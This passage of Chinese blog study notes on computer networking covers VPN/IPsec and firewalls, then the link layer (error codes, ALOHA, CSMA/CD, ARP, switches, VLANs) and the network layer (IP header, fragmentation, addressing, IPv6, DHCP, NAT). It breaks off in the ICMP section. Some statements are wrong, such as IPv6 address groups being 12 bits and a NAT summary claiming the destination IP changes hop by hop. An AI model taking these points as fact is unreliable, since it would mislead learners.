<p><img src="https://i.loli.net/2020/02/10/SRnjU6oa45tBFWC.png" alt="专用网络"></p>
<p>虚拟专用网络：通过建立在公共网络上的<strong>安全隧道</strong>，实现总部与分部的安全连接，在逻辑上建立一个专用网络，大大降低了费用。由隧道模式 ESP 实现的 IPsec 是 VPN 最常见的实现方法。</p>
<p><img src="https://i.loli.net/2020/02/10/Ay3ohPu6sZIarG2.png" alt="虚拟专用网络"></p>
<p>隧道：通过 Internet 提供安全的端到端的数据传输，本质上是一种加密与封装。数据进入隧道时经 VPN 封装在 Internet 中传输。</p>
<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><img src="https://i.loli.net/2020/02/11/cPOTpuCNy6EUd4F.png" alt="VPN实例"></p>
<ol>
<li>R1 将 IP 数据报转换为 IPsec 数据报<ul>
<li>检索 SPD，确定 SP</li>
<li>检索 SAD，确定 SA</li>
<li>在源 IP 数据报后面附加 ESP 尾部</li>
<li>利用 SA 的加密算法与密钥加密数据报</li>
<li>在加密结果前面附加 ESP 头</li>
<li>利用 SA 的加密算法与密钥创建报文认证码 MAC</li>
<li>构造新 IP 头，发到 R2 去</li>
</ul>
</li>
<li>R2 解封 IPsec 数据报<ul>
<li>提取 SPI 去检索 SAD，确定 SA</li>
<li>利用共享密钥解出原始 IP 数据报</li>
</ul>
</li>
</ol>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>防火墙是隔离内网与公共互联网，阻止某些分组进入 or 离开内网的软硬件设施。可分为三类：</p>
<ul>
<li>无状态分组过滤：位于网络边缘路由器，根据 IP 地址、端口号、协议类型等信息逐个过滤分组决定是否转发。</li>
<li>有状态组过滤：跟踪每个 TCP 连接，根据 SYN、FIN 等状态决定是否放行分组。</li>
<li>应用网关：基于应用层数据过滤分组</li>
</ul>
<p><img src="https://i.loli.net/2020/02/11/i87WYut32LzXHVG.png" alt="应用网关"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/06/网络那些事之网络安全/" data-id="ckoqstmgo0033gkupt25jz8tw" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-网络那些事之链路层" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2020/01/30/网络那些事之链路层/">网络那些事之链路层</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/30/网络那些事之链路层/" class="article-date">
  <time datetime="2020-01-30T08:51:35.000Z" itemprop="datePublished">2020-01-30</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <p>先明确几个术语：</p>
<ul>
<li>结点（node）：主机和路由器</li>
<li>链路（link）：相邻结点的连接通道</li>
<li>帧（frame）：链路层数据分组</li>
</ul>
<p>链路层负责通过一条链路在相邻结点之间传送数据报，提供的服务有：</p>
<ul>
<li>组帧：封装数据报构成数据帧，加首部和尾部，帧同步（将物理层比特流转换为帧）</li>
<li>链路接入：如果链路是共享的，需要解决<code>链路接入</code>问题。帧首部 MAC 地址用于标识帧的源和目的地</li>
<li>相邻结点间的可靠交付（不一定实现）</li>
<li>流量控制：协调相邻的发送和接收结点</li>
<li>差错检测与纠正：应对信号衰减和噪声</li>
</ul>
<h2 id="差错编码"><a href="#差错编码" class="headerlink" title="差错编码"></a>差错编码</h2><p>D -&gt; DR，R 为差错检测与纠正比特（冗余比特）：</p>
<p><img src="https://i.loli.net/2020/01/31/OQePn1hbz65NMXG.png" alt="线性分组码"></p>
<p><strong>差错编码不保证 100% 可靠</strong>，分为<strong>检错码</strong>与<strong>纠错码</strong>。</p>
<h3 id="检错"><a href="#检错" class="headerlink" title="检错"></a>检错</h3><p>设 C<sub>i</sub>、C<sub>j</sub> 为编码集中任意两个码字，C’ 为错出错码字：</p>
<p>对于检错码，如果编码集的汉明距离 d = r + 1，则该差错编码可以检测 r 位差错</p>
<p><img src="https://i.loli.net/2020/02/02/Z2LgfdqeOl64Nku.png" alt="检错码"></p>
<p>对于纠错码，若编码集的汉明距离 D = 2r + 1，则该差错编码可以纠错 r 位差错</p>
<p><img src="https://i.loli.net/2020/02/02/wfSurjoh4TsUFCg.png" alt="纠错码"></p>
<h4 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h4><p>给一串比特增加一个校验位，使得该串中所有 “1” 的个数之和为奇数称奇校验，为偶数称偶校验。</p>
<p><img src="https://i.loli.net/2020/02/02/Sb13soanWqRtAyV.png" alt="奇校验"></p>
<p><img src="https://i.loli.net/2020/02/02/gz5fEopJ2X7Zjw4.png" alt="偶校验"></p>
<p>数据和校验位发送给接受方后，接收方再次对数据中1的个数进行计算，如果为奇数则校验通过，表示此次传输过程未发生错误。如果不是奇数，则表示有错误发生，此时接收方可以向发送方发送请求，要求重新发送一遍数据。</p>
<p>优点：</p>
<ul>
<li>容易实现</li>
</ul>
<p>缺点：</p>
<ul>
<li>奇偶校验的检错率只有50%，因为只有奇数个数据位发生变化能检测到，如果偶数个数据位发生变化则无能为力了</li>
<li>每传输一个字节都需要加一位校验位，对传输效率影响很大</li>
<li>奇偶校验只能发现错误，但不能纠正错误，也就是说它只能告诉你出错了，但不能告诉你怎么出错了，一旦发现错误，只好重发</li>
</ul>
<h4 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h4><p>发送端：</p>
<ol>
<li>将数据按 16 bits 一组划分为的二进制数序列（此时数据中校验和字段为 0）</li>
<li>求和（Sum）：对这些二进制数求和（最高进位的 “1” 返回最低位继续相加）</li>
<li>校验和（CheckSum）：Sum 的反码</li>
</ol>
<p>接收端：</p>
<ol>
<li>重新计算数据的 CheckSum’（此时数据中校验和字段不为 0）</li>
<li>16 位 CheckSum’ 全为 0，无错</li>
</ol>
<h2 id="MAC-协议"><a href="#MAC-协议" class="headerlink" title="MAC 协议"></a>MAC 协议</h2><p>功能：多结点共享传输信道过程中，避免信号互相干扰。</p>
<p>有三类 MAC 协议：</p>
<ul>
<li>信道划分 MAC 协议：利用多路复用（时分、频分）支持多结点，每个结点只使用自己那部分</li>
<li>随机访问 MAC 协议：信道不划分，允许冲突。采用“冲突恢复”机制</li>
<li>轮转 MAX 协议：结点轮流使用信道，使用时占用全部带宽</li>
</ul>
<h3 id="随机访问-MAC-协议"><a href="#随机访问-MAC-协议" class="headerlink" title="随机访问 MAC 协议"></a>随机访问 MAC 协议</h3><p>结点发送分组时：</p>
<ul>
<li>利用信道全部带宽 R 发送分组</li>
<li>没有事先的结点间协调</li>
</ul>
<p>当两个或多个结点同时传输，会发生“<strong>冲突</strong>”。</p>
<h4 id="典型：时隙-ALOHA-协议"><a href="#典型：时隙-ALOHA-协议" class="headerlink" title="典型：时隙 ALOHA 协议"></a>典型：时隙 ALOHA 协议</h4><p>假定：</p>
<ul>
<li>所有帧大小相同</li>
<li>时间被划分为等长时隙（每个时隙刚好可以传输 1 个帧）</li>
<li>结点只在时隙开始时发送帧</li>
<li>结点能检测到冲突</li>
<li>所有结点的时钟同步</li>
</ul>
<p>运行：</p>
<ul>
<li>当结点有新帧，在下一时隙发送：<ul>
<li>无冲突：该结点可以在下一时隙继续发新帧</li>
<li>冲突：该结点在下一时隙以概率 <strong>P</strong> 重传帧</li>
</ul>
</li>
</ul>
<p>设 C 冲突时隙，E 空闲时隙，S 成功时隙：</p>
<p><img src="https://i.loli.net/2020/02/03/M2hT9UxicJ5mapt.png" alt="时隙ALOHA"></p>
<h4 id="典型：纯-ALOHA-协议"><a href="#典型：纯-ALOHA-协议" class="headerlink" title="典型：纯 ALOHA 协议"></a>典型：纯 ALOHA 协议</h4><p>不划分时隙的 ALOHA 协议，<strong>无需同步</strong>。</p>
<p>当有新的帧生成：</p>
<ul>
<li>立即发送</li>
<li>冲突可能性增大</li>
</ul>
<p>在 t<sub>0</sub> 时刻发送的帧，会与在 (t<sub>0</sub>-1, t<sub>0</sub>+1) 时间发送的帧冲突：<br><img src="https://i.loli.net/2020/02/03/HqX1ytmhi8RJxnD.png" alt="纯ALOHA"></p>
<h4 id="典型：CSMA-协议"><a href="#典型：CSMA-协议" class="headerlink" title="典型：CSMA 协议"></a>典型：CSMA 协议</h4><p>ALOHA 协议经常做些损人不利己的事，不考虑其它结点的感受去占用信道。<strong>载波监听多路访问协议 CSMA</strong>(carrier sense multiple access) 与之相比最大的改进在于<strong>发送帧之前，先监听信道（载波）</strong>：</p>
<ul>
<li>信道空闲：发送完整帧</li>
<li>信道忙：推迟发送<ul>
<li>1-坚持 CSMA：以概率 P=1 <strong>一直监听</strong>信道，一旦信道空闲立刻发送这个帧</li>
<li>非坚持 CSMA：<strong>随机监听</strong>信道</li>
<li>P-坚持 CSMA以 概率 P 坚持监听信道，以 概率 1-p 随机监听信道</li>
</ul>
</li>
</ul>
<p>由于信号在信道上的传输延迟，冲突仍然可能发生：</p>
<p><img src="https://i.loli.net/2020/02/03/hZRAYIUpXG9q6c3.png" alt="CSDM冲突"></p>
<h4 id="典型：CSMA-CD-协议"><a href="#典型：CSMA-CD-协议" class="headerlink" title="典型：CSMA/CD 协议"></a>典型：CSMA/CD 协议</h4><p>CSMA/CD 协议是带有冲突检测的 CSMA 协议：</p>
<ul>
<li>短时间内可以检测到冲突</li>
<li>冲突后传输中止，减少信道浪费</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/OiRWNLvsruQg4a5.png" alt="CSDM/CD冲突检测"></p>
<p>最大特点：<strong>边发边听，不发不听！</strong></p>
<p>设网络带宽 R(bps)，数据帧最小长度 L<sub>min(bits)，信号传播速度 V(m/s)：</sub></p>
<p><img src="https://i.loli.net/2020/02/03/1q5hVjXolUWLFsA.png" alt="最小发送时间"></p>
<p>A 如果要检测到 B 的冲突，必须保证 L<sub>min</sub>/R &gt;= 2d<sub>max</sub>/V，如果算上路由器等耗时则是 <strong>L<sub>min</sub>/R &gt;= RTT</strong>。</p>
<h3 id="信道划分与随机访问对比"><a href="#信道划分与随机访问对比" class="headerlink" title="信道划分与随机访问对比"></a>信道划分与随机访问对比</h3><p>信道划分 MAC 协议：</p>
<ul>
<li>网络负载重时，共享信道<strong>效率高</strong>且<strong>公平</strong></li>
<li>网络负载轻时，共享信道<strong>效率低</strong></li>
</ul>
<p>随机访问 MAC 协议：</p>
<ul>
<li>网络负载轻时，共享信道<strong>效率高</strong>，单个结点可以利用全部带宽</li>
<li>网络负载重时，产生冲突开销</li>
</ul>
<h2 id="ARP-与-MAC"><a href="#ARP-与-MAC" class="headerlink" title="ARP 与 MAC"></a>ARP 与 MAC</h2><p>MAC 地址共 48bits，用 16 进制形式表示。用于标识局域网内一个帧从哪个接口发出，到达哪个物理相连的其他接口。每块网卡都有自己独有的 MAC 地址，如：1A-2F-BB-76-09-AD</p>
<h2 id="ARP-协议"><a href="#ARP-协议" class="headerlink" title="ARP 协议"></a>ARP 协议</h2><p>地址解析协议（ARP, Address Resolve Protocal）负责网络层地址与链路层地址的转换。</p>
<p>ARP 表：LAN 中每个 IP 结点维护一个表，存储某些 LAN 结点的 [IP, MAC, TTL] 映射关系</p>
<p>下面是一个 ARP 表示例（本地网卡 IP 地址 192.168.100.107，子网掩码 255.255.255.0，默认网关 192.168.100.11）：</p>
<p><img src="https://i.loli.net/2020/05/17/d6eJ9OhzwVrcHxk.png" alt="ARP表"></p>
<p>例1：A 想要给<strong>同一局域网内</strong>的 B 发送数据报（B 的MAC 地址不在 A 的 ARP 表中）：</p>
<ol>
<li>A <strong>广播</strong> ARP 查询分组，其中包含 B 的 IP 地址</li>
<li>B 接收 ARP 查询分组，IP 地址匹配成功，向 A 应答 B 的 MAC 地址</li>
<li>A 在自己的 ARP 表中缓存 B 的 IP-MAC 映射直至超时（超时后再次刷新）</li>
</ol>
<p><img src="https://i.loli.net/2021/03/10/a8ercKtqWwEDu7p.png" alt="同一子网ARP.png"></p>
<p>例2：A 想要给<strong>不同局域网内</strong>的 B 发送数据报（B 的MAC 地址不在 A 的 ARP 表中，A 知道第一跳路由器接口的 MAC 地址）：</p>
<p><img src="https://i.loli.net/2020/02/03/6ISrl85JXjqokQC.png" alt="LAN间ARP"></p>
<ol>
<li>A 构造 IP 数据报，源 IP 地址为 A 的，目的 IP 地址为 B 的</li>
<li>A 构造链路层帧，源 MAC 地址为 A 的，目的 MAC 地址为第一跳路由器的</li>
<li>R 接收帧，提取 IP 数据报传递给上层 IP 协议，利用转发表转发 IP 数据报</li>
<li>R 创建链路层帧，源 MAC 地址为 R 出口的，目的 MAC 地址为 B 的</li>
</ol>
<p><strong>数据帧传递过程中源/目的 MAC 地址不断改变！</strong></p>
<p><img src="https://i.loli.net/2021/03/10/7QwzHUBKx8osWyj.png" alt="不同子网ARP.png"></p>
<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>交换机是典型的<strong>链路层设备</strong>，交换可以在多个主机间<strong>同时</strong>进行。特点有：</p>
<ul>
<li>存储、转发以太网帧</li>
<li>检验到达帧的 MAC 地址，选择性向一个或多个输出链路转发</li>
<li>利用 CSMA/CD 协议访问链路</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/TIbQX3Sf5Uc9nvB.png" alt="交换机"></p>
<p>每个交换机维护一张<strong>交换表</strong>，每个表项存放（主机 MAC 地址，到达主机的接口，时间戳）。</p>
<p>交换机通过<strong>自学习</strong>，获知到达主机的接口信息。当一个帧到达交换机时：</p>
<ol>
<li>收帧，交换机提取到帧的源 MAC 地址，将源主机的 MAC 地址与接口信息记录到交换表中</li>
<li>利用目的 MAC 地址检索交换表<ul>
<li>检索成功：如果目的主机与源主机处于同一网段（有相同的交换机接口）则丢弃帧；否则将帧转发到相应接口</li>
<li>检索失败：洪泛（向除了接收接口之外所有接口转发）</li>
</ul>
</li>
</ol>
<p><img src="https://i.loli.net/2020/02/03/gPpzCavur2m91bk.png" alt="组织机构网络"></p>
<h3 id="交换机-vs-路由器"><a href="#交换机-vs-路由器" class="headerlink" title="交换机 vs 路由器"></a>交换机 vs 路由器</h3><p>两者均为存储、转发设备：</p>
<ul>
<li>路由器：网络层设备（检测网络层分组首部）</li>
<li>交换机：链路层设备（检测链路层帧首部）</li>
</ul>
<p>两者均使用转发表：</p>
<ul>
<li>路由器：利用路由算法</li>
<li>交换机：利用自学习</li>
</ul>
<h2 id="虚拟局域网（VLAN）"><a href="#虚拟局域网（VLAN）" class="headerlink" title="虚拟局域网（VLAN）"></a>虚拟局域网（VLAN）</h2><p>通过对交换机接口或 MAC 地址进行分组，在一个物理局域网上配置多个虚拟局域网。这样就避免了广播报文（DHCP、ARP 等）在不必要的机器组中传播（<strong>流量隔离</strong>）：</p>
<p><img src="https://i.loli.net/2020/02/05/cZXOdiAoawHnWI7.png" alt="接口分组"></p>
<p><img src="https://i.loli.net/2020/02/05/OJNQRrKyuDflYqm.png" alt="MAC分组"></p>
<p><strong>通过路由器在 VLAN 间转发</strong>（像独立的交换机之间）。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/30/网络那些事之链路层/" data-id="ckoqstmdw001egkupc5wupaeh" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/链路层/">链路层</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
    <article id="post-网络那些事之网络层" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
      

<h2 itemprop="name">
  <a class="article-title" href="/2020/01/25/网络那些事之网络层/">网络那些事之网络层</a>
</h2>



    </header>
    

    
    <div class="article-meta">
      <a href="/2020/01/25/网络那些事之网络层/" class="article-date">
  <time datetime="2020-01-25T08:18:13.000Z" itemprop="datePublished">2020-01-25</time>
</a>
      
<div class="article-category">
  <a class="article-category-link" href="/categories/计算机网络/">计算机网络</a>
</div>

    </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      
      
      
      <p>网络层的核心功能有两个：</p>
<ul>
<li>路由：确定分组从源到目的经过的路径。由<strong>路由算法</strong>确定转发表</li>
<li>转发：数据报由路由器的输入端口转移到合适的输出端口。每个路由器维护一个<strong>转发表</strong></li>
</ul>
<h2 id="服务模型"><a href="#服务模型" class="headerlink" title="服务模型"></a>服务模型</h2><p>在发送方主机与接收方主机之间传输数据报。属于<code>尽力而为</code>服务。</p>
<ul>
<li>无连接服务：不事先为系列分组的传输确定路径，每个分组独立确定路径。由路由器根据当前网络状态选择路径（数据报网络）</li>
<li>连接服务：首先为系列分组的传输确定路径，建立网络层逻辑连接（虚电路网络）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/28/UXhmizIdVLYHj94.png" alt="网络层服务"></p>
<h3 id="虚电路网络"><a href="#虚电路网络" class="headerlink" title="虚电路网络"></a>虚电路网络</h3><p>虚电路：一条从源主机到目的主机，类似于实体电路的虚拟连接路径。与实际电路最大的区别在于<strong>分组交换</strong>。</p>
<p>路径上每一个网络设备都要维护虚电路连接状态。</p>
<h4 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h4><ol>
<li>呼叫建立</li>
<li>数据传输</li>
<li>拆除呼叫</li>
</ol>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>每条虚电路包括：</p>
<ul>
<li>源主机到目的主机的<strong>一条路径</strong></li>
<li><strong>虚电路号（VCID）</strong>，沿路每段链路一个编号</li>
<li>网络层设备（如路由器）<strong>用转发表记录经过的每条虚电路</strong></li>
</ul>
<p>沿某条虚电路传输的分组，携带对应虚电路的 VCID 而不是目的地址。</p>
<p><img src="https://i.loli.net/2020/01/25/79sQjzEGxgWF3oy.png" alt="虚电路号"></p>
<h3 id="数据报网络"><a href="#数据报网络" class="headerlink" title="数据报网络"></a>数据报网络</h3><p>特点：</p>
<ul>
<li>网络层无连接</li>
<li>每个分组携带目的地址</li>
<li>路由器根据分组目的地址转发分组（构建转发表、检索转发表、独立选路）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/25/kMumZIhvYcxjQod.png" alt="数据报网络"></p>
<p>路由器按照<strong>最长匹配前缀原则</strong>选择转发接口。</p>
<p>Internet 就属于数据报网络。</p>
<p>下面是一个现实中的路由表示例（本地网卡 IP 地址 192.168.100.107，子网掩码 255.255.255.0，默认网关 192.168.100.11）：</p>
<p><img src="https://i.loli.net/2020/05/17/EYpG8NLcA1yjivJ.png" alt="路由表"></p>
<p>接口列表指明了该机有哪些接口。网络目标 &amp; 网络掩码 == 子网，根据子网将数据报从不同接口发送出去。</p>
<ul>
<li>网络目标：用来标识数据包的目的网络</li>
<li>网络掩码：与网络目标一起标识目的主机或者路由器的子网地址</li>
<li>接口：数据包从哪个接口发出去</li>
<li>网关：数据包下一跳的 IP 地址</li>
<li>跃点：优先级，跃点越少优先级越高。</li>
</ul>
<table>
<thead>
<tr>
<th>网络目标</th>
<th>网络掩码</th>
<th>网关</th>
<th>接口</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>0.0.0.0</td>
<td>0.0.0.0</td>
<td>192.168.100.11</td>
<td>192.168.100.107</td>
<td>收到一个目的地址不在路由表中的数据包，将该数据包通过 192.168.100.107 发送到默认网关 192.168.100.11</td>
</tr>
<tr>
<td>127.0.0.0</td>
<td>255.0.0.0</td>
<td>在链路上</td>
<td>127.0.0.1</td>
<td>收到一个发往目标网段 127.0.0.0/8 的数据包时，发送给该网段的所有数据包</td>
</tr>
<tr>
<td>127.0.0.1</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>127.0.0.1</td>
<td>收到一个目的 IP 为默认本机 IP 的数据包时，系统会将该数据包收下</td>
</tr>
<tr>
<td>192.168.100.0</td>
<td>255.255.255.0</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个发往目的网段 192.168.100.0/24 的数据包时，将该数据包通过 192.168.100.107 这个接口发送出去</td>
</tr>
<tr>
<td>192.168.100.107</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个目的 IP 为本地网卡 IP 的数据包时，系统会将该数据包收下</td>
</tr>
<tr>
<td>192.168.100.255</td>
<td>255.255.255.255</td>
<td>在链路上</td>
<td>192.168.100.107</td>
<td>收到一个发给直连网段的本地广播数据包时，系统会将该数据包从 192.168.100.107 这个接口以广播的形式发送出去</td>
</tr>
</tbody>
</table>
<h2 id="IP-协议"><a href="#IP-协议" class="headerlink" title="IP 协议"></a>IP 协议</h2><p><img src="https://i.loli.net/2020/01/28/YEol4CqfpZMPDck.png" alt="IP数据报"></p>
<ul>
<li>版本号：4bits。</li>
<li>首部长度：4bits。首部字节数 = 4 * 首部长度</li>
<li>服务类型：8bits。区别不同类型 IP 数据报，只有在网络提供区分服务才有用</li>
<li>总长度：16bits。IP 分组的总字节数（20 B - 65535 B）</li>
<li>生存时间（TTL）：8bits。IP 分组在网络中可以通过的路由器数。路由器每转发一次这个值 -1</li>
<li>协议：8bits。指示 IP 分组封装的是哪个传输层协议（TCP/UDP）的数据报</li>
<li>首部校验和：16bits。对 IP 分组<strong>首部</strong>的差错检测，每次路由器转发都要重新计算</li>
<li>源 IP、目的 IP：32bits。</li>
<li>选项字段：1-40 bytes。IPv4 中<strong>通常不存在</strong>这个字段。</li>
<li>填充：0-3 bytes。补齐长度，保证首部长度是 4bytes 的倍数。</li>
</ul>
<p>IPv4 数据报首部长度通常为 20 bytes（5 行，每行 4bytes），第一个字节典型值为 45（版本号 4，首部长度 5）。</p>
<h3 id="IP-分片"><a href="#IP-分片" class="headerlink" title="IP 分片"></a>IP 分片</h3><p>最大传输单元（MTU）：<strong>链路层</strong>数据帧可封装的字节数的上限。不同链路的 MTU 可能不同。</p>
<p>为了解决不同链路之间 MTU 不同问题，IP 分组需要进行<strong>分片</strong>。IP 分片到达<strong>目的主机</strong>后进行<strong>重组</strong>。如果传输过程中个别分组丢失导致重组失败，目的主机直接<strong>丢弃</strong>已接收分组。</p>
<p>IP 首部相关字段参与标识分片与确定分片顺序：总长度、标识、标志位、片偏移。</p>
<ul>
<li>标识：16bits。标识一个 IP 分组。IP 协议利用一个计数器，每产生一个 IP 分组计数器 +1，作为该分组的表示。</li>
<li>标志位：3bits。保留 + DF(Don’t Fragment) + MF(More Fragment)<br><img src="https://i.loli.net/2020/01/28/JDLmZTzw6kbp3tq.png" alt="标志位格式"></li>
<li>片偏移：13bits。一个分片封装源 IP 分组数据的相对偏移量。偏移字节数 = 8 * 片偏移</li>
</ul>
<p>假设 IP 分组总长度 L，链路 MTU 为 M。若 L &gt; M 且 DF = 0，则需要分片。分片时每个分片的标识复制原 IP 分组的标识。除最后一个分片，其余分片均为 MTU 允许的最大分片且数据大小为 8 的倍数。</p>
<h3 id="IP-编址"><a href="#IP-编址" class="headerlink" title="IP 编址"></a>IP 编址</h3><h4 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h4><p>一共 32 bits，标识主机、路由器的<strong>接口</strong>。</p>
<h5 id="子网"><a href="#子网" class="headerlink" title="子网"></a>子网</h5><p>IP 地址 = 网络号（高比特位） + 主机号（低比特位）。相同网络号组成的网络称为<strong>IP 子网</strong>。转发表只记录<strong>子网地址</strong>。</p>
<p>IP 子网中的设备可以不跨越路由器彼此物理联通。</p>
<p><img src="https://i.loli.net/2020/01/29/wbMGcL2HjV3qKTO.png" alt="IP 子网"></p>
<h5 id="有类-IP-地址"><a href="#有类-IP-地址" class="headerlink" title="有类 IP 地址"></a>有类 IP 地址</h5><p><img src="https://i.loli.net/2020/01/29/hGEr5QJgxKwjLTb.png" alt="有类编址"></p>
<p>A 类网络数少，每个网络内主机数多；C 类网络数多，每个网络内主机数少。</p>
<p>D 类、E 类不划分网络号和主机号，D 类用于多播，E 类暂不使用。</p>
<h5 id="私有地址"><a href="#私有地址" class="headerlink" title="私有地址"></a>私有地址</h5><p>私有地址只用于子网内部，在公共 Internet 上无效。</p>
<p><img src="https://i.loli.net/2020/01/29/o5EFlHrysNKYw4X.png" alt="私有地址"></p>
<h5 id="特殊-IP-地址"><a href="#特殊-IP-地址" class="headerlink" title="特殊 IP 地址"></a>特殊 IP 地址</h5><p><img src="https://i.loli.net/2020/01/29/PktSwAIXfhDiHGd.png" alt="特殊 IP"></p>
<h5 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h5><p>IP 地址 = 网络号（高比特位） + 子网号（部分原主机号高比特位） + 主机号（低比特位）</p>
<h5 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h5><p>用途：表明一个 IP 地址所处子网的子网号。</p>
<p>取值： 32 bits。IP 地址的网络号、子网号全取 1，主机号全取 0。</p>
<p>例：A 网默认子网掩码 255.0.0.0；B 类默认子网掩码 255.255.0.0；C 类默认子网掩码 255.255.255.0；3 位子网号的 B 类子网掩码 255.255.224.0。</p>
<p><strong>“子网地址 + 子网掩码”确定子网大小！</strong></p>
<p>将 IP 分组目的 IP 地址与子网掩码<strong>按位与</strong>运算，得到<strong>子网地址</strong>。</p>
<h4 id="CIDR-Classless-InterDomain-Routing"><a href="#CIDR-Classless-InterDomain-Routing" class="headerlink" title="CIDR(Classless InterDomain Routing)"></a>CIDR(Classless InterDomain Routing)</h4><p>消除传统 A、B、C 类地址界限。网络号与主机号组成网络前缀，前缀可以任意长度。</p>
<p>融合子网地址与子网掩码，方便子网划分。无类地址格式：a.b.c.d/x，x 为前缀长度。</p>
<h4 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h4><p>IPv6 数据报格式：</p>
<ul>
<li>固定长度为 40bytes 的<strong>基本首部</strong></li>
<li>不允许分片</li>
</ul>
<p><img src="https://i.loli.net/2020/01/30/b1QmZhWnNd94vFs.png" alt="IPv6格式"></p>
<ul>
<li>流标签：24bits。表示同一“流”中的数据报。流：源主机到目的主机的所有 IPv6 数据报</li>
<li>载荷长度：16 bits。</li>
<li>下一首部：8bits。指向第一个扩展首部，如果扩展首部不存在则指向传输层报文首部</li>
<li>跳步限制：8bits。报文生存时间</li>
</ul>
<h5 id="IPv6-地址形式"><a href="#IPv6-地址形式" class="headerlink" title="IPv6 地址形式"></a>IPv6 地址形式</h5><p>一共 128 bits。划分为 8 组，每组 12 bits，以 16 进制表示。如：<code>1080:0:0:0:8:800:200C:417A</code>，当中间出现多个连续的 0，可以使用压缩形式：<code>1080::8:800:200C:417A</code>。</p>
<p><strong>IPv6 不再使用掩码！</strong>，统一以 CIDR 形式表示网络大小。</p>
<h5 id="相比-IPv4-的改变"><a href="#相比-IPv4-的改变" class="headerlink" title="相比 IPv4 的改变"></a>相比 IPv4 的改变</h5><ul>
<li><strong>检验和</strong>：彻底移除，每跳处理时间大大减少。</li>
<li><strong>选项</strong>：从基本首部移出变为可选，路由器转发时间减少。</li>
</ul>
<h2 id="DHCP-协议"><a href="#DHCP-协议" class="headerlink" title="DHCP 协议"></a>DHCP 协议</h2><p>主机从 DHCP 服务器动态获取 IP 地址、子网掩码、默认网关、DNS 服务器名称与地址等信息。</p>
<p><img src="https://i.loli.net/2020/01/29/Y1FasAxPQzDW8Id.png" alt="DHCP"></p>
<p>DHCP 协议在<strong>应用层</strong>实现：</p>
<ul>
<li>请求报文封装到 <strong>UDP</strong> 数据报中</li>
<li>IP 广播</li>
<li>链路层广播</li>
</ul>
<h4 id="网络地址转换（NAT）"><a href="#网络地址转换（NAT）" class="headerlink" title="网络地址转换（NAT）"></a>网络地址转换（NAT）</h4><p>多个私有 IP 地址组成的内网通过 NAT 转换成统一的公有 IP 地址与外网通信。</p>
<p>优势：</p>
<ul>
<li>只向 ISP 申请一个 IP 地址</li>
<li>本地设备变更 IP 地址对外网是透明的</li>
<li>变更 ISP 时，无需修改内网设备的 IP 地址</li>
<li>内网设备对外网不可见（安全）</li>
</ul>
<p>实现：</p>
<ul>
<li>替换：利用（NAT IP 地址，新端口号）替换每个<strong>外出 IP 数据报</strong>的（源 IP 地址，源端口号）</li>
<li>记录：将每对（NAT IP 地址，新端口号）与（源 IP 地址，源端口号）的替换信息存储到 <strong>NAT 转换表</strong> 中</li>
<li>替换：根据 NAT 转换表，利用（源 IP 地址，源端口号）替换每个<strong>进入内网 IP 数据报</strong>的（目的 IP 地址，目的端口号），即（NAT IP 地址，新端口号）</li>
</ul>
<p><img src="https://i.loli.net/2020/01/29/ZU9wXMSGixCm1Kf.png" alt="NAT过程"></p>
<p><strong>客户端发送给服务器的 IP 报文，源 IP 不变，目的 IP 随跳跃改变，服务器发送给客户端的 IP 报文，源 IP 随跳跃改变，目的 IP 不变</strong>。</p>
<p>NAT 穿透：</p>
<ul>
<li>端口转发：配置路由器，将外部客户对特定端口的请求转发给特定内部服务器</li>
<li>中继：内、外部客户分别与中继服务器建立连接。中继服务器桥接两个连接的分组（skype、frp 等应用都基于此）<br><img src="https://i.loli.net/2020/01/30/7BtAgQ8hsUYOklC.png" alt="中继"></li>
</ul>
<h2 id="ICMP-协议"><a href="#ICMP-协议" class="headerlink" title="ICMP 协议"></a>ICMP 协议</h2><p>当 IP 数据报传输出错<strong>被丢弃</strong>时，路由器向源主机发送 ICMP 报文。</p>
<p>功能：</p>
<ul>
<li>异常报告</li>
<li>网络探询</li>
</ul>
<p>两类 ICMP 报文：</p>
<ul>
<li>差错报告报文（5 种）：<ul>
<li>目的不可达</li>
